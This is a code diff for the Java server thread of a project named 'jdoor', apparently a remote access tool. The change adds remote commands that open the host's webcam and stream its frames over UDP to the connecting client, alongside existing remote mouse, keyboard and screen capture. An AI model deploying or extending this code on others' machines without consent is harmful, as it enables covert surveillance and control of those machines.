@@ -1,10 +1,12 @@
 package com.jdoor.server;
 
+import com.github.sarxos.webcam.Webcam;
 import com.jdoor.Constants;
+import com.jdoor.server.mouse.MouseController;
 import com.jdoor.server.commands.CommandControllerThread;
 import com.jdoor.server.keyboard.KeyboardController;
-import com.jdoor.server.mouse.MouseController;
 import com.jdoor.server.screen.ScreenCaptureThread;
+import com.jdoor.server.webcam.WebcamCaptureThread;
 
 import java.awt.*;
 import java.io.*;
@@ -14,19 +16,23 @@ import java.net.InetAddress;
 import java.net.Socket;
 import java.util.Arrays;
 
+import static com.jdoor.Constants.UDP_SCREEN_PORT;
+import static com.jdoor.Constants.UDP_WEBCAM_PORT;
+
 /**
  * Thread per gestire ogni client che si connette.
  */
 public class ServerThread extends Thread {
     private Socket clientSocket;
-    private final DatagramSocket datagramSocket;
+    private final DatagramSocket datagramScreenSocket;
+    private final DatagramSocket datagramWebcamSocket;
     private final InetAddress clientAddress;
 
     private final BufferedReader clientInput;
     private final BufferedWriter clientOutput;
-
     private boolean running;
     private boolean watching;
+
 
     /**
      * Costruttore del thread.
@@ -39,9 +45,10 @@ public class ServerThread extends Thread {
         clientInput = new BufferedReader(new InputStreamReader(socket.getInputStream()));
         clientOutput = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
 
-        datagramSocket = new DatagramSocket();
-        clientAddress = clientSocket.getInetAddress();
+        datagramScreenSocket = new DatagramSocket();
+        datagramWebcamSocket = new DatagramSocket();
 
+        clientAddress = clientSocket.getInetAddress();
         running = true;
         watching = true;
     }
@@ -51,7 +58,7 @@ public class ServerThread extends Thread {
      * Verrà chiamato solo da ScreenCaptureThread, NON VA CHIAMATO da nessun'altra parte.
      * @param buffer L'array di bytes che viene mandato al client che rappresenta l'immagine.
      */
-    public void sendScreen(byte[] buffer) {
+    public void sendStream(byte[] buffer, DatagramSocket socket, int port) {
         // Vedere quanti pacchetti servono per mandare l'immagine.
         // Visto che le immagini sono molto grandi e che un pacchetto UDP può essere massimo circa
         // 64kb, lo dividiamo in pacchetti di massimo 62kb per essere sicuri.
@@ -69,9 +76,9 @@ public class ServerThread extends Thread {
             //System.out.println("Slice è " + imageSlice.length + " di " + buffer.length);
 
             // Creare pacchetto UDP e mandarlo.
-            DatagramPacket datagramPacket = new DatagramPacket(imageSlice, imageSlice.length, clientAddress, 8081);
+            DatagramPacket datagramPacket = new DatagramPacket(imageSlice, imageSlice.length, clientAddress, port);
             try {
-                datagramSocket.send(datagramPacket);
+                socket.send(datagramPacket);
                 //System.out.println(clientSocket + ": Sent screen");
             } catch (IOException e) {
                 e.printStackTrace();
@@ -82,12 +89,20 @@ public class ServerThread extends Thread {
 
         // Creare il pacchetto che indica che si è giunti al termine dell'immagine e spedirlo.
         byte[] endPkt = {'E', 'N', 'D'};
-        DatagramPacket datagramPacket = new DatagramPacket(endPkt, endPkt.length, clientAddress, 8081);
+        DatagramPacket datagramPacket = new DatagramPacket(endPkt, endPkt.length, clientAddress, port);
         try {
-            datagramSocket.send(datagramPacket);
+            socket.send(datagramPacket);
         } catch (IOException e) {
             e.printStackTrace();
         }
+    }
+
+    public DatagramSocket getDatagramScreenSocket() {
+        return datagramScreenSocket;
+    }
+
+    public DatagramSocket getDatagramWebcamSocket() {
+        return datagramWebcamSocket;
     }
 
     /**
@@ -117,6 +132,10 @@ public class ServerThread extends Thread {
                 // Ottenere comando.
                 command = clientInput.readLine();
                 System.out.println("Command: " + command);
+
+                if(command == null) {
+                    command = "S";
+                }
 
                 switch (command.charAt(0)) {
                     // Il client ha premuto il mouse da qualche parte.
@@ -152,7 +171,22 @@ public class ServerThread extends Thread {
                         watching = !watching;
                         break;
 
+
                     // Il comando non è stato riconosciuto, mostriamo un errore.
+                    case 'W':
+                        Webcam webcam = WebcamCaptureThread.getWebcamCaptureThread().getWebcam();
+                        switch (command.charAt(1)) {
+                            case 'O':
+                                if(!webcam.isOpen())
+                                   webcam.open();
+                                break;
+                            case 'C':
+                                if(webcam.isOpen())
+                                    webcam.close();
+                                break;
+                        }
+                        break;
+
                     default:
                         System.out.println("Errore comando non riconosciuto: " + command);
                         clientOutput.write("Unknown command: " + command + "\n");
@@ -160,7 +194,6 @@ public class ServerThread extends Thread {
                         break;
                 }
             }
-
             clientSocket.close();
             clientSocket = null; // Indica che il client socket è stato chiuso.
         } catch (IOException | AWTException e) {
